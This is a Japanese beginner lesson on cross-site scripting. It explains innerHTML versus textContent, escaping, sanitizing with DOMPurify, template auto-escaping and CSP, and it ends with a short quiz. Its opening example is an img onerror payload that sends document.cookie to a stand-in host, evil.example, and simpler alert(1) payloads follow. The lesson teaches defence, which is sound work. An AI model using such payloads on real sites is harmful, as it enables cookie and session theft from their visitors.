---
title: XSS ― 他人のブラウザで勝手にプログラムが動く
level: 2
minutes: 20
concepts: [security, dom_ui, strings]
summary: 入力に仕込んだ HTML がそのまま表示されると、見た人のブラウザでプログラムが動く。innerHTML と textContent の違いを実際のブラウザで確かめ、エスケープ・サニタイズ・CSP で防ぐ。このサイト自身の守り方も読む。
---
## このレッスンのゴール

- XSS（クロスサイトスクリプティング）で何ができてしまうのかを説明できる
- `innerHTML` と `textContent` の違い、エスケープとサニタイズの違いが分かる
- テンプレート（Jinja2・React）が自動で守ってくれる範囲と、守ってくれない書き方が分かる

## 何が起きるのか

掲示板に、こんな「名前」で投稿されたとします。

```html
<img src=x onerror="fetch('https://evil.example/steal?c=' + document.cookie)">
```

これをそのまま HTML として表示すると、

1. ブラウザは `<img>` を画像だと思って `x` を読み込もうとする
2. `x` という画像は無いので、読み込みに失敗する
3. 失敗したときに実行する `onerror` の中身（JavaScript）が動く
4. **その掲示板を見た人全員** のブラウザで、Cookie などが攻撃者に送られる

攻撃者のプログラムが、**被害者のブラウザの中で、そのサイトの一員として動く** のが XSS です。

| XSS でできてしまうこと | |
|---|---|
| ログイン状態（Cookie・localStorage のトークン）を盗む | 被害者になりすませる |
| 被害者として操作する | 投稿・送金・パスワード変更 |
| 画面を書き換える | 偽のログイン画面を出してパスワードを入力させる |

## innerHTML と textContent

実際のブラウザ（Chromium）で、同じ文字列を 2 通りに表示してみました。

```javascript
const evil = '<img src=x onerror="window.hacked.push(\'innerHTML\')">こんにちは';

document.getElementById("a").innerHTML = evil;      // HTML として解釈する
document.getElementById("b").textContent = evil;    // ただの文字として表示する
```

```text
window.hacked → ["innerHTML"]                    ← innerHTML の方だけ、onerror が実行された
b の中身      → &lt;img src=x onerror=...&gt;こんにちは   ← 文字のまま表示された（実行されない）
```

| | `innerHTML` | `textContent` |
|---|---|---|
| `<b>太字</b>` | **太字** になる | `<b>太字</b>` という文字が見える |
| 外からの文字列に使うと | ⚠️ XSS | ✅ 安全 |

**外から来た文字列を表示するときは `textContent`** が基本です。

ちなみに、`innerHTML` で `<script>...</script>` を入れても実行されません（ブラウザの決まり）。でも、上のように `onerror` などを使えば実行できるので、「`<script>` を消せば安全」は間違いです。

## エスケープ：HTML の記号を文字に変える

HTML の中に文字列を埋め込むときは、意味を持つ記号を **別の書き方（文字参照）に置き換え** ます。これを **エスケープ** と呼びます。

| 記号 | 置き換え後 |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

```python
import html
html.escape('<a href="x">&</a>')
# '&lt;a href=&quot;x&quot;&gt;&amp;&lt;/a&gt;'
```

### このサイトの守り方

このサイトの `site/app.js` にも、同じ仕組みがあります。

```javascript
const esc = (s) =>
  String(s ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
```

5 つの記号を、正規表現で見つけて置き換えています。画面を組み立てるときに `${esc(c.title)}` のように、**文字列を HTML に入れる前に必ず通している** のが読み取れます。

## テンプレートは自動でエスケープしてくれる

```python
from jinja2 import Environment
t = "<p>こんにちは、{{ name }} さん</p>"

Environment(autoescape=True).from_string(t).render(name="<script>alert(1)</script>")
# '<p>こんにちは、&lt;script&gt;alert(1)&lt;/script&gt; さん</p>'   ← 安全

Environment(autoescape=False).from_string(t).render(name="<script>alert(1)</script>")
# '<p>こんにちは、<script>alert(1)</script> さん</p>'                ← 危ない
```

Flask・Django のテンプレート、React の `{name}`、Vue の `{{ name }}` は、**初期設定で自動エスケープ** してくれます。危ないのは、それを **わざと外す書き方** です。

| フレームワーク | 自動エスケープを外す書き方（⚠️） |
|---|---|
| Jinja2（Flask） | `{{ bio \| safe }}`、`Markup(...)`、`autoescape=False` |
| Django | `{{ bio \| safe }}`、`mark_safe(...)` |
| React | `dangerouslySetInnerHTML={{ __html: bio }}` |
| Vue | `v-html="bio"` |
| 素の JavaScript | `innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write` |

```python
Environment(autoescape=True).from_string("<p>{{ bio | safe }}</p>").render(bio="<img src=x onerror=alert(1)>")
# '<p><img src=x onerror=alert(1)></p>'      ← | safe で守りが外れた
```

## HTML を表示したいとき：サニタイズ

ブログの本文のように、**太字やリンクは使わせたいが、危ないものは消したい** ときは、**サニタイズ**（危ない部分だけを取り除く）をします。自分で書かず、専用のライブラリを使います。

```javascript
DOMPurify.sanitize('<img src=x onerror="...">こんにちは')
// '<img src="x">こんにちは'     ← onerror だけが消えた（実際に確認）
```

このサイトも、レッスンの Markdown を HTML にした後、必ず DOMPurify を通しています。

```javascript
const md = (text) => DOMPurify.sanitize(marked.parse(text ?? ""));
```

| | エスケープ | サニタイズ |
|---|---|---|
| すること | 記号を全部文字に変える | 危ないタグ・属性だけを取り除く |
| `<b>太字</b>` | 文字として見える | 太字になる |
| 使う場面 | 名前・コメントなど、HTML を使わせない場所（ほとんど） | Markdown・リッチテキストを表示する場所 |
| Python | `html.escape`、テンプレートの自動エスケープ | `nh3`、`bleach` |
| JavaScript | `textContent`、React の `{}` | DOMPurify |

## もう一枚の守り：CSP

**CSP（コンテンツセキュリティポリシー）** は、「このページでは、どこから来た JavaScript なら実行してよいか」をブラウザに伝える仕組みです。

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

これがあると、ページの中に紛れ込んだ `onerror="..."` のような書き方は実行されなくなります。エスケープの漏れがあっても止められる **多層防御**（レッスン 1）です。

## AI のコードではこう出てくる

| 見かけたら | 判定 |
|---|---|
| `el.innerHTML = 外からの値` / `` `<p>${name}</p>` `` を innerHTML へ | ⚠️ textContent にするか、エスケープ |
| `el.textContent = name` | ✅ |
| `dangerouslySetInnerHTML` / `v-html` / `\| safe` / `mark_safe` | ⚠️ 中身がどこから来るか確認。外からならサニタイズ |
| `marked(text)` の結果をそのまま innerHTML | ⚠️ Markdown にも HTML を書けるので、DOMPurify を通す |
| `<a href="${url}">` に外からの URL | ⚠️ `javascript:alert(1)` という URL も入れられる。`http:`・`https:` で始まるか確認 |
| 自作の「`<script>` を消す」処理 | ⚠️ `onerror` などで抜けられる。ライブラリを使う |
| ログインのトークンを localStorage に保存 | ⚠️ XSS が 1 つでもあれば盗まれる。HttpOnly の Cookie なら JavaScript から読めない |

```quiz
? 外から来た文字列 `name` を画面に表示するコードとして安全なのは？
- `el.innerHTML = name`
+ `el.textContent = name`
- `el.innerHTML = name.replace("<script>", "")`
> textContent は HTML として解釈せず、文字として表示します。`<script>` を消すだけでは、`<img onerror=...>` などで抜けられます。

? React で `<p>{comment}</p>` と書いた場合と、`dangerouslySetInnerHTML={{ __html: comment }}` と書いた場合の違いは？
+ 前者は自動でエスケープされて安全、後者は HTML として表示されるので外からの値には危険
- どちらも同じ
- 前者が危険で、後者が安全
> React の `{}` は自動エスケープしてくれます。名前のとおり「危険」な dangerouslySetInnerHTML は、サニタイズ済みの値にだけ使います。

? ブログで「太字やリンクは使えるが、危ないものは消したい」ときの正しい方法は？
- すべてエスケープする
- 自分で正規表現を書いて `<script>` を消す
+ DOMPurify などのサニタイズ用ライブラリを通してから表示する
> エスケープすると太字も文字になってしまいます。危ない部分だけを取り除くのがサニタイズで、抜け道が多いので専用のライブラリを使います。
```
